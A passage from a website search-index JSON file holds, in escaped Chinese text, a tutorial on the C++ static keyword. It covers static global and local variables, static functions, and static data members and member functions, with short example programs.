\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u53ef\u4ee5\u4efb\u610f\u5730\u8bbf\u95ee\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u9759\u6001\u6570\u636e\u6210\u5458\uff1b \u7531\u4e8e \u6ca1\u6709this\u6307\u9488\u7684\u989d\u5916\u5f00\u9500 \uff0c\u9759\u6001\u6210\u5458\u51fd\u6570\u4e0e\u7c7b\u7684\u5168\u5c40\u51fd\u6570\u76f8\u6bd4\u901f\u5ea6\u4e0a\u4f1a\u7a0d\u5feb\uff1b \u8c03\u7528\u9759\u6001\u6210\u5458\u51fd\u6570\uff0c\u548c\u666e\u901a\u6210\u5458\u51fd\u6570\u4e00\u6837\u9075\u5b88private\u3001protected\u3001public\u8bbf\u95ee\u539f\u5219\uff0c\u4e24\u79cd\u65b9\u5f0f\uff1a \u901a\u8fc7\u6210\u5458\u8bbf\u95ee\u64cd\u4f5c\u7b26(.)\u548c(->)\uff0c\u4e5f\u5373\u901a\u8fc7\u7c7b\u5bf9\u8c61\u6216\u6307\u5411\u7c7b\u5bf9\u8c61\u7684\u6307\u9488\u8c03\u7528\u9759\u6001\u6210\u5458\u51fd\u6570\u3002 \u76f4\u63a5\u901a\u8fc7\u7c7b\u6765\u8c03\u7528\u9759\u6001\u6210\u5458\u51fd\u6570\u3002\uff1c\u7c7b\u540d\uff1e::\uff1c\u9759\u6001\u6210\u5458\u51fd\u6570\u540d\uff1e\uff08\uff1c\u53c2\u6570\u8868\uff1e\uff09\u3002\u4e5f\u5373\uff0c\u9759\u6001\u6210\u5458\u4e0d\u9700\u8981\u901a\u8fc7\u5bf9\u8c61\u5c31\u80fd\u8bbf\u95ee\u3002 \u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898 \u5728\u4f7f\u7528\u5305\u542b\u9759\u6001\u6210\u5458\u7684\u7c7b\u65f6\uff0c\u6709\u65f6\u5019\u4f1a\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u751f\u6210\u4e34\u65f6\u7684\u9690\u85cf\u7684\u7c7b\u5bf9\u8c61\uff0c\u800c\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u5728\u6d88\u4ea1\u65f6\u4f1a\u8c03\u7528\u6790\u6784\u51fd\u6570\u6709\u53ef\u80fd\u4f1a\u5bf9\u9759\u6001\u53d8\u91cf\u505a\u64cd\u4f5c\uff08\u4f8b\u5982total_num--\uff09\uff0c\u53ef\u662f\u8fd9\u4e9b\u5bf9\u8c61\u5728\u751f\u6210\u65f6\u5374\u6ca1\u6709\u6267\u884c\u6784\u9020\u51fd\u6570\u4e2d\u7684total_num++\u7684\u64cd\u4f5c\u3002\u89e3\u51b3\u65b9\u6848\u662f\u4e3a\u8fd9\u4e2a\u7c7b\u5199\u4e00\u4e2a\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff0c\u5728\u8be5\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u4e2d\u5b8c\u6210total_num++\u7684\u64cd\u4f5c\u3002 REF \u00b6 https://zhuanlan.zhihu.com/p/37439983","title":"C++\u5173\u952e\u5b57static\u603b\u7ed3"},{"location":"c_cpp/2021_02_20_cpp_static/#cstatic","text":"C++\u7684static\u5173\u952e\u5b57\u6709\u4e24\u79cd\u7528\u6cd5\uff0c\u5206\u522b\u662f\u9762\u5411\u8fc7\u7a0b\u548c\u9762\u5411\u5bf9\u8c61\u3002\u9762\u5411\u8fc7\u7a0b\u6709\u9759\u6001\u5168\u5c40\u53d8\u91cf\uff0c\u9759\u6001\u5c40\u90e8\u53d8\u91cf\uff0c\u9759\u6001\u51fd\u6570\uff1b\u9762\u5411\u5bf9\u8c61\u6709\u9759\u6001\u6210\u5458\u53d8\u91cf\uff0c\u9759\u6001\u6210\u5458\u51fd\u6570\u3002","title":"C++\u5173\u952e\u5b57static\u603b\u7ed3"},{"location":"c_cpp/2021_02_20_cpp_static/#_1","text":"","title":"\u9762\u5411\u8fc7\u7a0b"},{"location":"c_cpp/2021_02_20_cpp_static/#_2","text":"\u5728\u5168\u5c40\u53d8\u91cf\u524d\uff0c\u52a0\u4e0a\u5173\u952e\u5b57static\uff0c\u8be5\u53d8\u91cf\u5c31\u88ab\u5b9a\u4e49\u6210\u4e3a\u4e00\u4e2a\u9759\u6001\u5168\u5c40\u53d8\u91cf\u3002\u4f8b\u5982\uff1a #include<iostream> using namespace std; static int globalValue1; int main() { cout << globalValue1 << endl; } \u9759\u6001\u5168\u5c40\u53d8\u91cf\u7531\u4ee5\u4e0b\u7279\u70b9\uff1a \u8be5\u53d8\u91cf\u5728\u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff0c\u5176\u5b9e\u9759\u6001\u53d8\u91cf\u90fd\u5728\u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff0c\u5305\u62ec\u9759\u6001\u5c40\u90e8\u53d8\u91cf \u672a\u7ecf\u521d\u59cb\u5316\u7684\u9759\u6001\u5168\u5c40\u53d8\u91cf\u4f1a\u88ab\u7a0b\u5e8f\u81ea\u52a8\u521d\u59cb\u5316\u4e3a0\uff08\u81ea\u52a8\u53d8\u91cf\u7684\u81ea\u52a8\u521d\u59cb\u5316\u503c\u662f\u968f\u673a\u7684\uff09 \u9759\u6001\u5168\u5c40\u53d8\u91cf\u5728\u58f0\u660e\u5b83\u7684\u6574\u4e2a\u6587\u4ef6\u90fd\u662f\u53ef\u89c1\u7684\uff0c\u800c\u5728\u6587\u4ef6\u4e4b\u5916\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u5373\u9759\u6001\u5168\u5c40\u53d8\u91cf\u4e0d\u80fd\u88ab\u5176\u5b83\u6587\u4ef6\u6240\u7528\u3002\u56e0\u6b64\uff0c \u5176\u5b83\u6587\u4ef6\u4e2d\u53ef\u4ee5\u5b9a\u4e49\u76f8\u540c\u540d\u5b57\u7684\u53d8\u91cf\uff0c\u4e0d\u4f1a\u53d1\u751f\u51b2\u7a81 \uff0c\u8fd9\u662f\u9759\u6001\u5168\u5c40\u53d8\u91cf\u7684\u4f18\u70b9\u3002 \u4f8b\u5982 //main.cpp #include<iostream> using namespace std; static int globalValue1; int main() { cout << globalValue1 << endl; } //source.cpp #include<iostream> using namespace std; int globalValue1 = 1; void f1() { globalValue1 += 1; cout << globalValue1 << endl; } \u5982\u679c\u4e24\u4e2a\u6587\u4ef6\u91cc\u7684 globalValue1 \u90fd\u6ca1\u6709static\u4fee\u9970\uff0c\u8fd9\u56de\u5f15\u53d1\u91cd\u5b9a\u4e49\u7684\u9519\u8bef\uff1b\u53ea\u8981\u6709\u4e00\u4e2a gobalValue1 \u6709\u4fee\u9970\u90fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002 \u5982\u679c\u628asource.cpp\u7684 globalValue1 \u6539\u6210 extern int globalValue1 \uff0c\u4e5f\u4f1a\u62a5\u9519\u3002","title":"\u9759\u6001\u5168\u5c40\u53d8\u91cf"},{"location":"c_cpp/2021_02_20_cpp_static/#_3","text":"\u5728\u5c40\u90e8\u53d8\u91cf\u524d\uff0c\u52a0\u4e0a\u5173\u952e\u5b57static\uff0c\u8be5\u53d8\u91cf\u5c31\u88ab\u5b9a\u4e49\u6210\u4e3a\u4e00\u4e2a\u9759\u6001\u5c40\u90e8\u53d8\u91cf\u3002\u5b83\u6709\u4ee5\u4e0b\u7279\u70b9 \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u5728\u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff1b \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u5728\u7a0b\u5e8f\u6267\u884c\u5230\u8be5\u5bf9\u8c61\u7684\u58f0\u660e\u5904\u65f6\u88ab\u9996\u6b21\u521d\u59cb\u5316\uff0c\u5373\u4ee5\u540e\u7684\u51fd\u6570\u8c03\u7528\u4e0d\u518d\u8fdb\u884c\u521d\u59cb\u5316\uff1b \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u4e00\u822c\u5728\u58f0\u660e\u5904\u521d\u59cb\u5316\uff0c\u5982\u679c\u6ca1\u6709\u663e\u5f0f\u521d\u59cb\u5316\uff0c\u4f1a\u88ab\u7a0b\u5e8f\u81ea\u52a8\u521d\u59cb\u5316\u4e3a0\uff1b \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u59cb\u7ec8\u9a7b\u7559\u5728\u5168\u5c40\u6570\u636e\u533a\uff0c\u76f4\u5230\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\u3002\u4f46\u5176\u4f5c\u7528\u57df\u4e3a\u5c40\u90e8\u4f5c\u7528\u57df\uff0c\u5f53\u5b9a\u4e49\u5b83\u7684\u51fd\u6570\u6216\u8bed\u53e5\u5757\u7ed3\u675f\u65f6\uff0c\u5176\u4f5c\u7528\u57df\u968f\u4e4b\u7ed3\u675f","title":"\u9759\u6001\u5c40\u90e8\u53d8\u91cf"},{"location":"c_cpp/2021_02_20_cpp_static/#_4","text":"\u901a\u5e38\uff0c\u5728\u51fd\u6570\u4f53\u5185\u5b9a\u4e49\u4e86\u4e00\u4e2a\u53d8\u91cf\uff0c\u6bcf\u5f53\u7a0b\u5e8f\u8fd0\u884c\u5230\u8be5\u8bed\u53e5\u65f6\u90fd\u4f1a\u7ed9\u8be5\u5c40\u90e8\u53d8\u91cf\u5206\u914d\u6808\u5185\u5b58\u3002\u4f46\u968f\u7740\u7a0b\u5e8f\u9000\u51fa\u51fd\u6570\u4f53\uff0c\u7cfb\u7edf\u5c31\u4f1a\u6536\u56de\u6808\u5185\u5b58\uff0c\u5c40\u90e8\u53d8\u91cf\u4e5f\u76f8\u5e94\u5931\u6548\u3002 \u4f46\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u5728\u4e24\u6b21\u8c03\u7528\u4e4b\u95f4\u5bf9\u53d8\u91cf\u7684\u503c\u8fdb\u884c\u4fdd\u5b58\u3002\u901a\u5e38\u7684\u60f3\u6cd5\u662f\u5b9a\u4e49\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u6765\u5b9e\u73b0\u3002\u4f46\u8fd9\u6837\u4e00\u6765\uff0c\u53d8\u91cf\u5df2\u7ecf\u4e0d\u518d\u5c5e\u4e8e\u51fd\u6570\u672c\u8eab\u4e86\uff0c\u4e0d\u518d\u4ec5\u53d7\u51fd\u6570\u7684\u63a7\u5236\uff0c\u8fd9\u7ed9\u7a0b\u5e8f\u7684\u7ef4\u62a4\u5e26\u6765\u4e0d\u4fbf\u3002 \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u6b63\u597d\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u9759\u6001\u5c40\u90e8\u53d8\u91cf\u4fdd\u5b58\u5728\u5168\u5c40\u6570\u636e\u533a\uff0c\u800c\u4e0d\u662f\u4fdd\u5b58\u5728\u6808\u4e2d\uff0c\u6bcf\u6b21\u7684\u503c\u4fdd\u6301\u5230\u4e0b\u4e00\u6b21\u8c03\u7528\uff0c\u76f4\u5230\u4e0b\u6b21\u8d4b\u65b0\u503c\u3002 \u4f8b\u5982 #include <iostream.h> void fn(); void main() { fn(); //10 fn(); //11 fn(); //12 } void fn() { static n=10; cout<<n<<endl; n++; }","title":"\u5e94\u7528\u573a\u666f"},{"location":"c_cpp/2021_02_20_cpp_static/#_5","text":"\u5728\u51fd\u6570\u7684\u8fd4\u56de\u7c7b\u578b\u524d\u52a0\u4e0astatic\u5173\u952e\u5b57,\u51fd\u6570\u5373\u88ab\u5b9a\u4e49\u4e3a\u9759\u6001\u51fd\u6570\u3002\u9759\u6001\u51fd\u6570\u4e0e\u666e\u901a\u51fd\u6570\u4e0d\u540c\uff0c\u5b83\u53ea\u80fd\u5728\u58f0\u660e\u5b83\u7684\u6587\u4ef6\u5f53\u4e2d\u53ef\u89c1\uff0c\u4e0d\u80fd\u88ab\u5176\u5b83\u6587\u4ef6\u4f7f\u7528\u3002\u5b9a\u4e49\u9759\u6001\u51fd\u6570\u7684\u597d\u5904\uff1a\uff08\u7c7b\u4f3c\u4e8e\u9759\u6001\u5168\u5c40\u53d8\u91cf\uff09 \u9759\u6001\u51fd\u6570\u4e0d\u80fd\u88ab\u5176\u5b83\u6587\u4ef6\u6240\u7528\uff1b \u5176\u5b83\u6587\u4ef6\u4e2d\u53ef\u4ee5\u5b9a\u4e49\u76f8\u540c\u540d\u5b57\u7684\u51fd\u6570\uff0c\u4e0d\u4f1a\u53d1\u751f\u51b2\u7a81\uff1b \u53ef\u4ee5\u628a\u9759\u6001\u51fd\u6570\u7684\u5b9a\u4e49\u653e\u5230.h\u6587\u4ef6\uff0c\u591a\u4e2a.cpp\u6587\u4ef6include\u65f6\uff0c\u4e0d\u4f1a\u5f15\u8d77\u91cd\u5b9a\u4e49\u7684\u9519\u8bef\u3002 \u4f8b\u5982 // main.cpp #include<iostream> // #include\"source.h\",\u5373\u4f7finclude\u4e86void f1();\u7684\u58f0\u660e\uff0c\u4e5f\u4e0d\u4f1a\u62a5\u9519 using namespace std; static void f1() { cout << \"main.f1()\" << endl; } int main() { f1(); } // source.cpp #include<iostream> #include \"source.h\" void f1() { std::cout << \"source.f1\" << std::endl; }","title":"\u9759\u6001\u51fd\u6570"},{"location":"c_cpp/2021_02_20_cpp_static/#_6","text":"","title":"\u9762\u5411\u5bf9\u8c61"},{"location":"c_cpp/2021_02_20_cpp_static/#_7","text":"\u5728\u7c7b\u5185\u6570\u636e\u6210\u5458\u7684\u58f0\u660e\u524d\u52a0\u4e0a\u5173\u952e\u5b57static\uff0c\u8be5\u6570\u636e\u6210\u5458\u5c31\u662f\u7c7b\u5185\u7684\u9759\u6001\u6570\u636e\u6210\u5458\u3002\u4f8b\u5982 // main.cpp #include<iostream> #include\"source.h\" using namespace std; int main() { MyClass a(1, 2, 3); a.getSum(); MyClass b(2, 3, 4); b.getSum(); a.getSum(); cout << MyClass::Num << endl; } // source.h #pragma once class MyClass { public: static int Num; MyClass(int a,int b,int c); void getSum(); private: int a, b, c; static int Sum; // \u58f0\u660e\u9759\u6001\u6570\u636e\u6210\u5458 }; // source.cpp #include<iostream> #include \"source.h\" using namespace std; int MyClass::Num = 3; int MyClass::Sum = 0; // \u5b9a\u4e49\u5e76\u521d\u59cb\u5316\u9759\u6001\u6570\u636e\u6210\u5458 MyClass::MyClass(int a, int b, int c) { this->a = a; this->b = b; this->c = c; Sum = a + b + c; } void MyClass::getSum() { cout << Sum << endl; } \u5b83\u6709\u4ee5\u4e0b\u7279\u70b9 \u9759\u6001\u6210\u5458\u53d8\u91cf\u662f\u8be5\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u6240\u5171\u6709\u7684\u3002\u5bf9\u4e8e\u666e\u901a\u6210\u5458\u53d8\u91cf\uff0c\u6bcf\u4e2a\u7c7b\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u4e00\u4efd\u62f7\u8d1d\u3002\u800c\u9759\u6001\u6210\u5458\u53d8\u91cf\u4e00\u5171\u5c31\u4e00\u4efd\uff0c\u65e0\u8bba\u8fd9\u4e2a\u7c7b\u7684\u5bf9\u8c61\u88ab\u5b9a\u4e49\u4e86\u591a\u5c11\u4e2a\uff0c\u9759\u6001\u6210\u5458\u53d8\u91cf\u53ea\u5206\u914d\u4e00\u6b21\u5185\u5b58\uff0c\u7531\u8be5\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u5171\u4eab\u8bbf\u95ee\u3002\u6240\u4ee5\uff0c\u9759\u6001\u6570\u636e\u6210\u5458\u7684\u503c\u5bf9\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u662f\u4e00\u6837\u7684\uff0c\u5b83\u7684\u503c\u53ef\u4ee5\u66f4\u65b0\uff1b \u56e0\u4e3a\u9759\u6001\u6570\u636e\u6210\u5458\u5728 \u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58 \uff0c\u7531\u672c\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u5171\u4eab\uff0c\u6240\u4ee5\uff0c\u5b83\u4e0d\u5c5e\u4e8e\u7279\u5b9a\u7684\u7c7b\u5bf9\u8c61\uff0c\u4e0d\u5360\u7528\u5bf9\u8c61\u7684\u5185\u5b58\uff0c\u800c\u662f\u5728\u6240\u6709\u5bf9\u8c61\u4e4b\u5916\u5f00\u8f9f\u5185\u5b58\uff0c \u5728\u6ca1\u6709\u4ea7\u751f\u7c7b\u5bf9\u8c61\u65f6\u5176\u4f5c\u7528\u57df\u5c31\u53ef\u89c1 \u3002\u56e0\u6b64\uff0c\u5728\u6ca1\u6709\u7c7b\u7684\u5b9e\u4f8b\u5b58\u5728\u65f6\uff0c\u9759\u6001\u6210\u5458\u53d8\u91cf\u5c31\u5df2\u7ecf\u5b58\u5728\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u64cd\u4f5c\u5b83\uff1b \u9759\u6001\u6210\u5458\u53d8\u91cf\u5b58\u50a8\u5728\u5168\u5c40\u6570\u636e\u533a\u3002 static \u6210\u5458\u53d8\u91cf\u7684\u5185\u5b58\u7a7a\u95f4\u65e2\u4e0d\u662f\u5728\u58f0\u660e\u7c7b\u65f6\u5206\u914d\uff0c\u4e5f\u4e0d\u662f\u5728\u521b\u5efa\u5bf9\u8c61\u65f6\u5206\u914d\uff0c\u800c\u662f\u5728\u521d\u59cb\u5316\u65f6\u5206\u914d\u3002\u9759\u6001\u6210\u5458\u53d8\u91cf\u5fc5\u987b\u521d\u59cb\u5316\uff0c\u800c\u4e14\u53ea\u80fd\u5728\u7c7b\u4f53\u5916\u8fdb\u884c\u3002 \u5426\u5219\uff0c\u7f16\u8bd1\u80fd\u901a\u8fc7\uff0c\u94fe\u63a5\u4e0d\u80fd\u901a\u8fc7\u3002\u5728source.cpp\u4e2d\uff0c\u8bed\u53e5 int Myclass::Sum=0; \u662f\u5b9a\u4e49\u5e76\u521d\u59cb\u5316\u9759\u6001\u6210\u5458\u53d8\u91cf\u3002\u521d\u59cb\u5316\u65f6\u53ef\u4ee5\u8d4b\u521d\u503c\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u8d4b\u503c\u3002\u5982\u679c\u4e0d\u8d4b\u503c\uff0c\u90a3\u4e48\u4f1a\u88ab\u9ed8\u8ba4\u521d\u59cb\u5316\uff0c\u4e00\u822c\u662f 0\u3002\u9759\u6001\u6570\u636e\u533a\u7684\u53d8\u91cf\u90fd\u6709\u9ed8\u8ba4\u7684\u521d\u59cb\u503c\uff0c\u800c\u52a8\u6001\u6570\u636e\u533a\uff08\u5806\u533a\u3001\u6808\u533a\uff09\u7684\u53d8\u91cf\u9ed8\u8ba4\u662f\u5783\u573e\u503c\u3002\u5e76\u4e14\uff0c\u4e00\u822c\u4e0d\u518d.h\u6587\u4ef6\u91cc\u5b9a\u4e49\u5e76\u521d\u59cb\u5316\u9759\u6001\u6210\u5458\u53d8\u91cf\uff0c\u5426\u5219\u5982\u679c\u591a\u4e2a\u6e90\u6587\u4ef6include\u8be5\u5934\u6587\u4ef6\u662f\uff0c\u4f1a\u5bfc\u81f4\u91cd\u5b9a\u4e49\u9519\u8bef\u3002 static \u6210\u5458\u53d8\u91cf\u548c\u666e\u901a static \u53d8\u91cf\u4e00\u6837\uff0c\u7f16\u8bd1\u65f6\u5728\u9759\u6001\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff0c\u5230\u7a0b\u5e8f\u7ed3\u675f\u65f6\u624d\u91ca\u653e\u3002\u8fd9\u5c31\u610f\u5473\u7740\uff0cstatic \u6210\u5458\u53d8\u91cf\u4e0d\u968f\u5bf9\u8c61\u7684\u521b\u5efa\u800c\u5206\u914d\u5185\u5b58\uff0c\u4e5f\u4e0d\u968f\u5bf9\u8c61\u7684\u9500\u6bc1\u800c\u91ca\u653e\u5185\u5b58\u3002\u800c\u666e\u901a\u6210\u5458\u53d8\u91cf\u5728\u5bf9\u8c61\u521b\u5efa\u65f6\u5206\u914d\u5185\u5b58\uff0c\u5728\u5bf9\u8c61\u9500\u6bc1\u65f6\u91ca\u653e\u5185\u5b58\u3002 \u9759\u6001\u6570\u636e\u6210\u5458\u521d\u59cb\u5316\u4e0e\u4e00\u822c\u6570\u636e\u6210\u5458\u521d\u59cb\u5316\u4e0d\u540c\u3002 \u521d\u59cb\u5316\u65f6\u53ef\u4ee5\u4e0d\u52a0 static\uff0c\u4f46\u5fc5\u987b\u8981\u6709\u6570\u636e\u7c7b\u578b\u3002 \u88ab private\u3001protected\u3001public \u4fee\u9970\u7684 static \u6210\u5458\u53d8\u91cf\u90fd\u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u5f0f\u521d\u59cb\u5316\u3002\u9759\u6001\u6570\u636e\u6210\u5458\u521d\u59cb\u5316\u7684\u683c\u5f0f\u4e3a\uff1a\uff1c\u6570\u636e\u7c7b\u578b\uff1e\uff1c\u7c7b\u540d\uff1e::\uff1c\u9759\u6001\u6570\u636e\u6210\u5458\u540d\uff1e=\uff1c\u503c\uff1e \u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf\u8bbf\u95ee\u5f62\u5f0f1\uff1a\uff1c\u7c7b\u5bf9\u8c61\u540d\uff1e.\uff1c\u9759\u6001\u6570\u636e\u6210\u5458\u540d\uff1e \u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf\u8bbf\u95ee\u5f62\u5f0f2\uff1a\uff1c\u7c7b\u7c7b\u578b\u540d\uff1e::\uff1c\u9759\u6001\u6570\u636e\u6210\u5458\u540d\uff1e\uff0c\u4e5f\u5373\uff0c \u9759\u6001\u6210\u5458\u4e0d\u9700\u8981\u901a\u8fc7\u5bf9\u8c61\u5c31\u80fd\u8bbf\u95ee\u3002 \u9759\u6001\u6570\u636e\u6210\u5458\u548c\u666e\u901a\u6570\u636e\u6210\u5458\u4e00\u6837\u9075\u4ecepublic,protected,private\u8bbf\u95ee\u89c4\u5219\uff1b \u5982\u679c\u9759\u6001\u6570\u636e\u6210\u5458\u7684\u8bbf\u95ee\u6743\u9650\u5141\u8bb8\u7684\u8bdd\uff08\u5373public\u7684\u6210\u5458\uff09\uff0c\u53ef\u5728\u7a0b\u5e8f\u4e2d\uff0c\u6309\u4e0a\u8ff0\u683c\u5f0f\u6765\u5f15\u7528\u9759\u6001\u6570\u636e\u6210\u5458 \uff1b sizeof \u8fd0\u7b97\u7b26\u4e0d\u4f1a\u8ba1\u7b97 \u9759\u6001\u6210\u5458\u53d8\u91cf\u3002","title":"\u9759\u6001\u6570\u636e\u6210\u5458"},{"location":"c_cpp/2021_02_20_cpp_static/#_8","text":"\u4e0e\u9759\u6001\u6210\u5458\u53d8\u91cf\u7c7b\u4f3c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u9759\u6001\u6210\u5458\u51fd\u6570\u3002 \u9759\u6001\u6210\u5458\u51fd\u6570\u4e3a\u7c7b\u670d\u52a1\u800c\u4e0d\u662f\u4e3a\u67d0\u4e00\u4e2a\u7c7b\u7684\u5177\u4f53\u5bf9\u8c61\u670d\u52a1\u3002\u9759\u6001\u6210\u5458\u51fd\u6570\u4e0e\u9759\u6001\u6210\u5458\u53d8\u91cf\u4e00\u6837\uff0c\u90fd\u662f\u7c7b\u7684\u5185\u90e8\u5b9e\u73b0\uff0c\u5c5e\u4e8e\u7c7b\u5b9a\u4e49\u7684\u4e00\u90e8\u5206\u3002\u666e\u901a\u6210\u5458\u51fd\u6570\u5fc5\u987b\u5177\u4f53\u4f5c\u7528\u4e8e\u67d0\u4e2a\u5bf9\u8c61\uff0c\u800c\u9759\u6001\u6210\u5458\u51fd\u6570\u5e76\u4e0d\u5177\u4f53\u4f5c\u7528\u4e8e\u67d0\u4e2a\u5bf9\u8c61\u3002 \u666e\u901a\u7684\u6210\u5458\u51fd\u6570\u4e00\u822c\u90fd\u9690\u542b\u4e86\u4e00\u4e2athis\u6307\u9488\uff0cthis\u6307\u9488\u6307\u5411\u7c7b\u7684\u5bf9\u8c61\u672c\u8eab\uff0c\u56e0\u4e3a\u666e\u901a\u6210\u5458\u51fd\u6570\u603b\u662f\u5177\u4f53\u5730\u5c5e\u4e8e\u7c7b\u7684\u67d0\u4e2a\u5177\u4f53\u5bf9\u8c61\u7684\u3002\u5f53\u51fd\u6570\u88ab\u8c03\u7528\u65f6\uff0c\u7cfb\u7edf\u4f1a\u628a\u5f53\u524d\u5bf9\u8c61\u7684\u8d77\u59cb\u5730\u5740\u8d4b\u7ed9 this \u6307\u9488\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cthis\u662f\u7f3a\u7701\u7684\u3002\u5982\u51fd\u6570fn()\u5b9e\u9645\u4e0a\u662fthis->fn()\u3002 \u4e0e\u666e\u901a\u51fd\u6570\u76f8\u6bd4\uff0c\u9759\u6001\u6210\u5458\u51fd\u6570\u5c5e\u4e8e\u7c7b\u672c\u8eab\uff0c\u800c\u4e0d\u4f5c\u7528\u4e8e\u5bf9\u8c61\uff0c\u56e0\u6b64\u5b83\u4e0d\u5177\u6709this\u6307\u9488\u3002\u6b63\u56e0\u4e3a\u5b83\u6ca1\u6709\u6307\u5411\u67d0\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u8bbf\u95ee\u5c5e\u4e8e\u7c7b\u5bf9\u8c61\u7684\u975e\u9759\u6001\u6210\u5458\u53d8\u91cf\u548c\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\uff0c\u5b83\u53ea\u80fd\u8c03\u7528\u5176\u4f59\u7684\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u9759\u6001\u6210\u5458\u53d8\u91cf\u3002\u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u7531\u4e8e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u9759\u6001\u6210\u5458\u53d8\u91cf\u5728\u7c7b\u5b9e\u4f8b\u5316\u4e4b\u524d\u5c31\u5df2\u7ecf\u5b58\u5728\u53ef\u4ee5\u8bbf\u95ee\uff0c\u800c\u6b64\u65f6\u975e\u9759\u6001\u6210\u5458\u8fd8\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u56e0\u6b64\u9759\u6001\u6210\u5458\u4e0d\u80fd\u8bbf\u95ee\u975e\u9759\u6001\u6210\u5458\u3002 \u9759\u6001\u6210\u5458\u51fd\u6570\u7684\u7279\u70b9\uff1a \u51fa\u73b0\u5728\u7c7b\u4f53\u5916\u7684\u51fd\u6570\u5b9a\u4e49\u4e0d\u80fd\u6307\u5b9a\u5173\u952e\u5b57static\uff1b \u9759\u6001\u6210\u5458\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u8bbf\u95ee\uff0c\u5373\u9759\u6001\u6210\u5458\u51fd\u6570\uff08\u4ec5\uff09\u53ef\u4ee5\u8bbf\u95ee\u9759\u6001\u6210\u5458\u53d8\u91cf\u3001\u9759\u6001\u6210\u5458\u51fd\u6570\uff1b \u9759\u6001\u6210\u5458\u51fd\u6570\u4e0d\u80fd\u8bbf\u95ee\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u975e\u9759\u6001\u6210\u5458\u53d8\u91cf\uff1b \u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u53ef\u4ee5\u4efb\u610f\u5730\u8bbf\u95ee\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u9759\u6001\u6570\u636e\u6210\u5458\uff1b \u7531\u4e8e \u6ca1\u6709this\u6307\u9488\u7684\u989d\u5916\u5f00\u9500 \uff0c\u9759\u6001\u6210\u5458\u51fd\u6570\u4e0e\u7c7b\u7684\u5168\u5c40\u51fd\u6570\u76f8\u6bd4\u901f\u5ea6\u4e0a\u4f1a\u7a0d\u5feb\uff1b \u8c03\u7528\u9759\u6001\u6210\u5458\u51fd\u6570\uff0c\u548c\u666e\u901a\u6210\u5458\u51fd\u6570\u4e00\u6837\u9075\u5b88private\u3001protected\u3001public\u8bbf\u95ee\u539f\u5219\uff0c\u4e24\u79cd\u65b9\u5f0f\uff1a \u901a\u8fc7\u6210\u5458\u8bbf\u95ee\u64cd\u4f5c\u7b26(.)\u548c(->)\uff0c\u4e5f\u5373\u901a\u8fc7\u7c7b\u5bf9\u8c61\u6216\u6307\u5411\u7c7b\u5bf9\u8c61\u7684\u6307\u9488\u8c03\u7528\u9759\u6001\u6210\u5458\u51fd\u6570\u3002 \u76f4\u63a5\u901a\u8fc7\u7c7b\u6765\u8c03\u7528\u9759\u6001\u6210\u5458\u51fd\u6570\u3002\uff1c\u7c7b\u540d\uff1e::\uff1c\u9759\u6001\u6210\u5458\u51fd\u6570\u540d\uff1e\uff08\uff1c\u53c2\u6570\u8868\uff1e\uff09\u3002\u4e5f\u5373\uff0c\u9759\u6001\u6210\u5458\u4e0d\u9700\u8981\u901a\u8fc7\u5bf9\u8c61\u5c31\u80fd\u8bbf\u95ee\u3002 \u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898 